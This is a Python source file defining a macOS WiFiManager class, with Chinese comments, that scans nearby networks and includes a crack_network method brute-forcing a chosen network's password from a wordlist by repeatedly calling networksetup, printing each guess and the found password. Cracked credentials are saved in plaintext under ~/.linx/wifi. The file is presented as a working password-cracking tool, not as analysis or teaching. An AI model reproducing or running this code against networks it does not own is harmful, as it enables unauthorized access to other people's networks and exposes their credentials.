import os
import sys
import time
import subprocess
from typing import List, Dict, Optional, Any

class WiFiManager:
    def __init__(self, interface: str) -> None:
        self.interface = interface
        self.networks = []
        self.current_network = None

    def scan_networks(self) -> List[Dict[str, Any]]:
        """扫描可用的WiFi网络"""
        try:
            # 使用系统命令扫描WiFi网络
            cmd = ['airport', '-s']
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output, error = process.communicate()
            
            if error:
                print(f'[!] 扫描出错: {error.decode()}')
                return []
            
            # 解析扫描结果
            networks = []
            for line in output.decode().split('\n')[1:]:  # 跳过标题行
                if line.strip():
                    parts = line.split()
                    if len(parts) >= 6:
                        network = {
                            'ssid': parts[0],
                            'bssid': parts[1],
                            'rssi': parts[2],
                            'channel': parts[3],
                            'security': parts[6] if len(parts) > 6 else 'NONE'
                        }
                        networks.append(network)
            
            self.networks = networks
            return networks
        except Exception as e:
            print(f'[!] 扫描WiFi网络时出错: {str(e)}')
            return []

    def crack_network(self, ssid: str, wordlist_path: str) -> Optional[str]:
        """使用字典破解指定的WiFi网络"""
        try:
            if not os.path.exists(wordlist_path):
                print(f'[!] 字典文件不存在: {wordlist_path}')
                return None

            print(f'[*] 开始破解网络: {ssid}')
            print(f'[*] 使用字典: {wordlist_path}')

            with open(wordlist_path, 'r') as f:
                for password in f:
                    password = password.strip()
                    print(f'[*] 尝试密码: {password}')

                    # 尝试连接网络
                    if self._try_connect(ssid, password):
                        print(f'[+] 成功破解! 密码: {password}')
                        return password

            print(f'[-] 未能破解网络: {ssid}')
            return None
        except Exception as e:
            print(f'[!] 破解过程中出错: {str(e)}')
            return None

    def _try_connect(self, ssid: str, password: str) -> bool:
        """尝试使用给定的密码连接WiFi网络"""
        try:
            # 使用系统命令尝试连接
            cmd = ['networksetup', '-setairportnetwork', self.interface, ssid, password]
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            _, error = process.communicate()

            if not error:
                self.current_network = ssid
                return True
            return False
        except Exception:
            return False

    def disconnect(self) -> bool:
        """断开当前WiFi连接"""
        try:
            if not self.current_network:
                return True

            cmd = ['networksetup', '-setairportpower', self.interface, 'off']
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            _, error = process.communicate()

            if not error:
                self.current_network = None
                return True
            return False
        except Exception:
            return False

    def get_current_network(self) -> Optional[str]:
        """获取当前连接的网络"""
        return self.current_network

    def save_network_config(self, ssid: str, password: str) -> bool:
        """保存网络配置信息"""
        try:
            config_dir = os.path.expanduser('~/.linx/wifi')
            if not os.path.exists(config_dir):
                os.makedirs(config_dir)

            config_file = os.path.join(config_dir, f'{ssid}.conf')
            with open(config_file, 'w') as f:
                f.write(f'SSID={ssid}\nPASSWORD={password}\n')
            return True
        except Exception as e:
            print(f'[!] 保存网络配置时出错: {str(e)}')
            return False